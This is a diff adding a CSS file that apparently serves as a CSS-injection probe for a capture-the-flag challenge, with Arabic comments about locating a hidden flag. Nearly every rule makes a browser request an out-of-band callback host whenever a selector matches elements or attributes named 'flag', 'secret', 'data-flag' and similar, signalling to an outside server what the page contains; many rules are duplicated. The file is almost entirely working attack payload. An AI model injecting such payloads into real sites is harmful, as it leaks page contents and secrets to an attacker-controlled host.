@@ -1,0 +1,143 @@
+input.csrf {
+    background-image:url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/found_in_csrf");
+}
+  /* نختبر 5 أماكن محتملة لاختباء العلم */
+body[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/found_in_body-one"); 
+}
+
+.wrapper[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/found_in_data"); 
+}
+
+#flag { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/found_in_flag"); 
+}
+
+.flag-container { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/found_in_container"); 
+}
+
+[title*="flag"] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/found_in_title"); 
+}
+body[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/found_in_body"); 
+}
+/* ============================================ */
+/* 1. اختبار الصفات (Attributes) التي تحوي "flag" */
+/* ============================================ */
+
+[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_data-flag"); 
+}
+
+[flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_flag"); 
+}
+
+[data-secret] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_data-secret"); 
+}
+
+[secret] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_secret"); 
+}
+
+[attr$="flag"] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_ends_with_flag"); 
+}
+
+/* ============================================ */
+/* 2. اختبار المعرفات (ID) والكلاسات (Classes)   */
+/* ============================================ */
+
+#flag { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ID_flag"); 
+}
+
+.flag { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_CLASS_flag"); 
+}
+
+[id*="flag"] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ID_contains_flag"); 
+}
+
+[class*="flag"] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_CLASS_contains_flag"); 
+}
+
+/* ============================================ */
+/* 3. اختبار العناصر الأساسية (الأكثر شيوعاً)   */
+/* ============================================ */
+
+body[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_BODY_data-flag"); 
+}
+
+html[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_HTML_data-flag"); 
+}
+
+.wrapper[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_WRAPPER_data-flag"); 
+}
+
+.container[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_CONTAINER_data-flag"); 
+}
+
+h1[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_H1_data-flag"); 
+}
+
+p[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_P_data-flag"); 
+}
+
+[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_data-flag"); 
+}
+[flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_flag"); 
+}
+[data-secret] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_data-secret"); 
+}
+[secret] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_secret"); 
+}
+[attr$="flag"] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ATTR_ends_with_flag"); 
+}
+#flag { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ID_flag"); 
+}
+.flag { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_CLASS_flag"); 
+}
+[id*="flag"] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_ID_contains_flag"); 
+}
+[class*="flag"] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_CLASS_contains_flag"); 
+}
+body[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_BODY_data-flag"); 
+}
+html[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_HTML_data-flag"); 
+}
+.wrapper[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_WRAPPER_data-flag"); 
+}
+.container[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_CONTAINER_data-flag"); 
+}
+h1[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_H1_data-flag"); 
+}
+p[data-flag] { 
+    background-image: url("https://d8e5f7a2894b2c6a9abbgwxbu3eyyyyyb.oast.pro/PROBE_P_data-flag"); 
+}
